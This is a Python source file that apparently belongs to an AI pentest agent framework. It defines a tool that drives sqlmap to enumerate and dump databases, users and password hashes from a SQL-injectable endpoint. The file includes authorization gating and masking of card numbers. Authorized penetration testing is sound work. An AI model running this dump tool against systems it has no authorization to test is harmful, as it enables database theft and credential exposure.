"""SQLi data-extraction tool (post-validation exfiltration).

Once ``validate_sqli`` / ``sqlmap_scan`` has CONFIRMED an injectable endpoint,
this tool drives sqlmap's enumeration/dump phase (``--dbs`` / ``--tables`` /
``--dump``) to produce evidence for the finding.

It REUSES ``sqlmap_scan`` (``kryon.tools.web.sqlmap``) for the actual, tested
command construction instead of rebuilding the command string by hand. The
previous hand-rolled version emitted an invalid ``--output-format json`` flag
(sqlmap has no such option), pasted always-on empty flags (``--data ''``,
``--dbms ``, ...) that corrupt the invocation, and interpolated the URL and
parameters straight into a shell string — a command-injection footgun.

Banca-safe contract: registered into the tool registry ONLY under
``KRYON_RED_TEAM`` (active-pentest profile, written authorization required) —
see ``tool_budget.POST_EXPLOITATION_TOOLS``. Card-number-shaped sequences in
the output are masked (project rule: never log real PANs).
"""

from __future__ import annotations

import re

from kryon.sdk.agents import function_tool
from kryon.tools.web.sqlmap import sqlmap_scan

# 13–19 digit sequences (optionally separated by a single space or dash) are
# treated as candidate card numbers and masked to the last 4. Conservative by
# design: in a banking context, over-masking is safer than leaking a PAN.
_PAN_RE = re.compile(r"\b(?:\d[ -]?){12,18}\d\b")


def _mask_pans(text: str) -> str:
    """Mask card-number-shaped digit sequences, keeping only the last 4."""

    def _mask(match: re.Match[str]) -> str:
        digits = re.sub(r"\D", "", match.group(0))
        if not 13 <= len(digits) <= 19:
            return match.group(0)
        return "*" * (len(digits) - 4) + digits[-4:]

    return _PAN_RE.sub(_mask, text)


@function_tool
def sqlmap_dump_database(
    url: str,
    data: str = "",
    cookie: str = "",
    headers: str = "",
    dbms: str = "",
    db: str = "",
    tbl: str = "",
    col: str = "",
    enumerate_dbs: bool = False,
    enumerate_tables: bool = False,
    enumerate_columns: bool = False,
    dump: bool = False,
    get_users: bool = False,
    get_passwords: bool = False,
    get_current_user: bool = False,
    level: int = 1,
    risk: int = 1,
) -> str:
    """Enumerate or dump data from an ALREADY-CONFIRMED SQL-injectable endpoint.

    Run this only after ``validate_sqli`` / ``sqlmap_scan`` has confirmed the
    injection. Choose what to extract with the boolean flags, and scope a dump
    with ``db`` / ``tbl`` / ``col`` to avoid pulling entire databases. With no
    flag set it defaults to listing databases (the lowest-impact option).

    Args:
        url: Target URL carrying the injectable parameter
            (e.g. ``"http://target/page.php?id=1"``).
        data: POST body when the injectable parameter is sent via POST.
        cookie: Cookie header value for authenticated endpoints.
        headers: Extra headers, newline-separated (``"Name: value"``).
        dbms: Force the DBMS (mysql/postgresql/mssql/oracle/...) to skip probing.
        db: Restrict enumeration/dump to this database.
        tbl: Restrict to this table.
        col: Restrict to these columns (comma-separated).
        enumerate_dbs: List databases (``--dbs``).
        enumerate_tables: List tables (``--tables``).
        enumerate_columns: List columns (``--columns``).
        dump: Dump rows of the selected db/tbl/col (``--dump``).
        get_users: List DB users (``--users``).
        get_passwords: List DB user password hashes (``--passwords``).
        get_current_user: Show the current DB user (``--current-user``).
        level: sqlmap test level (1-5).
        risk: sqlmap risk (1-3).

    Returns:
        sqlmap stdout, with card-number-shaped sequences masked.
    """
    if not any(
        (
            enumerate_dbs,
            enumerate_tables,
            enumerate_columns,
            dump,
            get_users,
            get_passwords,
            get_current_user,
        )
    ):
        # Default to a safe, low-impact enumeration rather than a no-op run.
        enumerate_dbs = True

    raw = sqlmap_scan._raw_fn(
        url=url,
        data=data,
        cookie=cookie,
        headers=headers,
        method="POST" if data else "GET",
        dbms=dbms,
        db=db,
        tbl=tbl,
        col=col,
        dbs=enumerate_dbs,
        tables=enumerate_tables,
        columns=enumerate_columns,
        dump=dump,
        users=get_users,
        passwords=get_passwords,
        current_user=get_current_user,
        level=level,
        risk=risk,
        batch=True,
    )
    return _mask_pans(raw if isinstance(raw, str) else str(raw))
